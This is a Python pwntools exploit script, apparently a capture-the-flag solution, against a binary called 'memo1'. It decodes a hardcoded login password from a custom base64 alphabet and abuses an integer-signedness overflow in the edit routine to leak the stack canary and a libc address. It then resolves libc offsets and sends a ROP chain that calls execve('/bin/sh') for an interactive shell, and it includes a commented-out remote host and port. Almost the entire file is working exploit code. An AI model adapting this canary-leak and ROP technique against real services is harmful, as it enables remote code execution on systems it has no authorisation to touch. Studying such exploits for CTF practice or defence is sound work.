
# Reuse memo0 for login
class Memo0:
    str_const = r'J8ITC7oaC7ofwTEbACM9zD4mC7oayqY9C7o9Kd=='.encode() # 最终结果按 str_const 的长度进行比较
    cipher = r'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/'.encode()

    @staticmethod
    def encrypt(s: str):
        '''
        process 3-input and give 4-output, out_len = in_len * 4 / 3 (round up)
        '''

        if isinstance(s, str):
            s = s.encode()
        s: bytes

        padding_len = (3 - len(s) % 3) % 3

        s += b'\x00' * padding_len
        groups = [s[i:i+3] for i in range(0, len(s), 3)]

        ret = bytearray()
        for group in groups:
            c, nc, nnc = group
            mix = (nc << 8) + (c << 16) + nnc

            buf = bytearray(4)
            buf[0] = Memo0.cipher[(mix >> 18) & 0x3F]
            buf[1] = Memo0.cipher[(mix >> 12) & 0x3F]
            buf[2] = Memo0.cipher[(mix >> 6) & 0x3F]
            buf[3] = Memo0.cipher[mix & 0x3F]

            ret += buf
        
        for i in range(0, padding_len):
            ret[len(ret) - i -1 ] = 61 # '='
        return ret

    @staticmethod
    def decrypt(s: str):
        '''
        process 4-input and give 3-output, out_len = in_len * 3 / 4
        '''

        if isinstance(s, str):
            s = s.encode()
        s: bytes

        assert len(s) % 4 == 0

        padding_len = s.count(b'=')

        groups = [s[i:i+4] for i in range(0, len(s) - padding_len, 4)]

        ret = bytearray()
        for group in groups:
            c, nc, nnc, nnnc = group
            try:
                mix = (Memo0.cipher.index(c) << 18) + (Memo0.cipher.index(nc) << 12) + (Memo0.cipher.index(nnc) << 6) + Memo0.cipher.index(nnnc)

                buf = bytearray(3)
                buf[0] = (mix >> 16) & 0xFF
                buf[1] = (mix >> 8) & 0xFF
                buf[2] = mix & 0xFF

                ret += buf
            except:
                # == 
                mix = sum([Memo0.cipher.index(c) << (18 - i * 6) for i, c in enumerate(group) if c != 61])

                buf = bytearray([mix >> (16 - i * 8) & 0xFF for i in range(3)])
                ret += buf

        return ret[:-padding_len]

password = Memo0.decrypt(Memo0.str_const).decode()
# print(password)
# exit()
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = ('debug', 'error')[0]

elf_ = ELF('./memo1')
# sh: process = elf_.process()
# sh = remote('111.186.57.85', 40311)

sh:process = gdb.debug('./memo1', gdbscript='''
           break login
           ''')

class Memo1:
    ADD, SHOW, EDIT, CLEAN = 1, 2, 3, 4
    EOL = b'\n'
    DATA_SIZE = 264

    def __init__(self) -> None:
        sh.sendlineafter(b'password', password.encode())

        self.canary = 0
        # self.main_rbp = 0
        self.main_ret = 0
        self.__libc_start_main = 0
        self.system = 0

    def _enter_round(self, i: int):
        sh.sendlineafter(b'choice:', str(i).encode())
        return self

    def overflow_edit(self):
        '''
        overflow the edit operation with -1
        and send string.

        remember to show canary after
        '''
        self._enter_round(Memo1.EDIT)
        
        _N_OVERFLOW = Memo1.DATA_SIZE  + (1 << 63) + 1 # Fill canary[0]
        _N_OVERFLOW = u64(p64(_N_OVERFLOW, signed = False), signed = True)

        sh.sendlineafter(b'change', str(_N_OVERFLOW).encode()) 
        sh.send(b'A' * (Memo1.DATA_SIZE + 1))
        sh.recvuntil(b"Done!\n")    
        return self
    
    def show_canary(self):
        self._enter_round(Memo1.SHOW)
        sh.recvuntil(b"Content:\n")
        line = sh.recvuntil(b"\n=================", True)
        assert len(line) >= Memo1.DATA_SIZE + 8, str(len(line) - Memo1.DATA_SIZE).encode() +  b"-len string terminate early since 0: " + line[Memo1.DATA_SIZE:]
        self.canary:int = u64(line[Memo1.DATA_SIZE: Memo1.DATA_SIZE + 8]) & 0xFFFFFFFFFFFFFF00

        # main function's rbp is 0

        # self.main_rbp = u64(line[Memo1.DATA_SIZE + 8: Memo1.DATA_SIZE + 8 * 2])
        # self.main_ret = u64(line[Memo1.DATA_SIZE + 8 * 2: Memo1.DATA_SIZE + 8 * 3])
        return self
    
    def overflow_edit_ret(self, recover_canary = False):
        '''
        overflow the edit operation with -1
        and send string.

        remember to show canary after
        '''
        self._enter_round(Memo1.EDIT)
        
        _N_OVERFLOW = Memo1.DATA_SIZE  + (1 << 63) + 8*(1+1) # Fill canary, rbp
        _N_OVERFLOW = u64(p64(_N_OVERFLOW, signed = False), signed = True)

        sh.sendlineafter(b'change', str(_N_OVERFLOW).encode()) 
        sh.send(flat(b'A' * Memo1.DATA_SIZE, p64(self.canary + (0xff if not recover_canary else 0)), b'B' * 8)) # canary[0] is recovered in show
        sh.recvuntil(b"Done!\n")    
        return self
    
    def show_libc_start_main(self):
        self._enter_round(Memo1.SHOW)
        sh.recvuntil(b"Content:\n")
        line = sh.recvuntil(b"\n=================", True)
        assert 2*8 <= len(line) - Memo1.DATA_SIZE < 3*8, str(len(line) - Memo1.DATA_SIZE).encode() +  b"-len string terminate early since 0: " + line[Memo1.DATA_SIZE:]
        assert self.canary == u64(line[Memo1.DATA_SIZE: Memo1.DATA_SIZE + 8]) & 0xFFFFFFFFFFFFFF00

        self.main_ret = u64(line[Memo1.DATA_SIZE + 8*2:].ljust(8, b'\x00'))
        self.__libc_start_main = self.main_ret - 0xd90 + 0xdc0
        
        # recover canary
        self.overflow_edit_ret(recover_canary = True)
        return self
    
    def overflow_shell(self):
        self._enter_round(Memo1.EDIT)

        _N_OVERFLOW = Memo1.DATA_SIZE  + (1 << 63) + 8 * (1+1 +2+3+2+1) # canary + rbp + rop + binsh + ret 
        _N_OVERFLOW = u64(p64(_N_OVERFLOW, signed = False), signed = True)

        sh.sendlineafter(b'change', str(_N_OVERFLOW).encode())
        
        payload = b'A' * Memo1.DATA_SIZE + p64(self.canary) + b'B' * 8 +\
              p64(self.rdi) + p64(self.binsh) + \
               p64(self.rdxrbx) + p64(0) + p64(0) + \
               p64(self.rsi) + p64(0) + \
                p64(self.execve)#p64(0x7ffff7c50d70)
        sh.send(payload)
        sh.recvuntil(b"Done!\n")
        self._enter_round(5)
        return self
    
    def parselibc(self):
        from LibcSearcher import LibcSearcher

        print("libc_start_main: ", hex(self.__libc_start_main))
        # self.libc_base = self.__libc_start_main - 0x29DC0
        # self.system = self.libc_base + 0x50D70
        # self.rdi = self.libc_base + 0x2a3e5
        # self.binsh = self.libc_base + 0x1d8678
        libc = LibcSearcher('__libc_start_main', self.__libc_start_main)
        libc.add_condition('system', 0x50D70) #! system 莫名其妙不能用
        libc.add_condition('str_bin_sh', 0x1d8678)
        libc.add_condition('execve', 0x080)
        libc.add_condition('read', 0x7d0)

        self.libc_base = self.__libc_start_main - libc.dump('__libc_start_main')

        self.system = self.libc_base + libc.dump('system')
        self.binsh = self.libc_base + libc.dump('str_bin_sh') 
        self.execve = self.libc_base + libc.dump('execve')
        self.rdi = self.libc_base + 0x2a3e5 
        self.rdxrbx = self.libc_base + 0x904a9 #! IMPORTANT execve 有多个参数
        self.rsi = self.libc_base + 0x2be51
        print("rdi = ", hex(self.rdi))
        print("rdxrbx = ", hex(self.rdxrbx))
        print("rsi = ", hex(self.rsi))
        print("execve = ", hex(self.execve))
        return self

    
obj = Memo1().overflow_edit().show_canary().overflow_edit_ret().show_libc_start_main()
obj.parselibc().overflow_shell()
print(obj.canary)
sh.interactive()